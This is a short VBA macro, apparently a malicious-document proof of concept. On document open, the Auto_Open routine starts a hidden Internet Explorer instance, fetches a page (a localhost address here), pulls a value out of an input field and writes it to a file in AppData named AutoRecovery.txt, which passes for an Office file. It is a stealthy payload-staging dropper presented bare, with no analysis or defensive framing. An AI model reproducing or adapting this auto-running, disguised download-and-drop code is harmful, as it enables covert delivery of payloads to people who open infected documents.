Sub Auto_Open
    Set IE = CreateObject("InternetExplorer.Application")
    IE.Visible = False

    IE.Navigate "http://127.0.0.1/test.txt"
     
    Do While IE.Busy
        Application.Wait DateAdd("s", 1, Now)
    Loop
        
    Set doc = IE.Document
    Set objCollection = IE.Document.getElementsByTagName("input")
    Dim mapache As String
    If objCollection(0).Name = "s" Then
        apache = objCollection(0).Value
    End If
        
    Filename = Environ("AppData") & "\AutoRecovery.txt"    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set Fileout = fso.CreateTextFile(Filename, True, True)
    Fileout.Write apache
    Fileout.Close          
End Sub
